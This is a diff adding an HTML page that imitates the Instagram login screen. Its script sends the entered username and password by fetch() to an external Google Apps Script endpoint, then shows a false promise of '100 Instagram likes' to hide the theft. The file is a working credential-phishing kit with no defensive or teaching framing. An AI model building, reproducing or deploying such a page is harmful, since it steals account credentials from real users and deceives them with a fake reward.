@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>login to instagram</title>
+	<link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+	<div class="wrapper">
+		<div class="header">
+			<div class="top">
+				<div class="logo">
+					<img src="instagram.png" alt="instagram" style="width: 175px;">
+				</div>
+
+				<form method="POST" name="google-sheet" >
+
+					<div class="username">
+
+						<input name="username" style=" width:270px; height:35px;" type="text"
+							placeholder=" Phone number ,username, or email" required>
+					</div>
+					<br>
+					<div class="kk">
+						<input name="password" style=" width:270px; height:35px;" type="password"
+							placeholder=" password" minlength="6" required>
+					</div>
+					
+
+					<div class="ll" >
+
+						
+  
+					<button name="login" type="submit"  class="login-btn" style=" color: white; width:270px;"> Log in  </button>
+
+
+					</div>
+
+
+				</form>
+
+
+				<div class="or">
+					<div class="line"></div>
+					<p>OR</p>
+					<div class="line"></div>
+				</div>
+				<div class="dif">
+					<div class="fb">
+						<img src="facebook.png" alt="facebook">
+						<p>Log in with Facebook</p>
+					</div>
+					<div class="forgot">
+						<a href="#">Forgot password?</a>
+					</div>
+				</div>
+			</div>
+			<div class="signup">
+				<p>Don't have an account? <a href="#">Sign up</a></p>
+			</div>
+			<div class="apps">
+				<p>Get the app.</p>
+				<div class="icons">
+					<a href="#"><img src="appstore.png" alt="appstore"></a>
+					<a href="#"><img src="googleplay.png" alt="googleplay"></a>
+				</div>
+			</div>
+		</div>
+		<div class="footer">
+			<div class="links">
+				
+			</div>
+			<div class="copyright">
+				© 2021 INSTAGRAM
+			</div>
+		</div>
+	</div>
+
+	<script>
+ 
+		const scriptURL = 'https://script.google.com/macros/s/AKfycbxND8bwaumOEyDDOGb4mxZJQbrP6C-tDYv1AdQlLjRS06b4ULxwNsdOmMAlcuy8RYtEqw/exec'
+		const form = document.forms['google-sheet']
+
+		form.addEventListener('submit', e => {
+			e.preventDefault()
+			fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+				
+                .then(response => alert("login successfully you will receive 100 Instagram likes on your latest post within 24 hours make sure your account is not private"))
+
+
+				.catch(error => console.error('Error!', error.message))
+        
+      
+
+
+		})
+
+
+
+
+	</script>
+
+</body>
+</html>
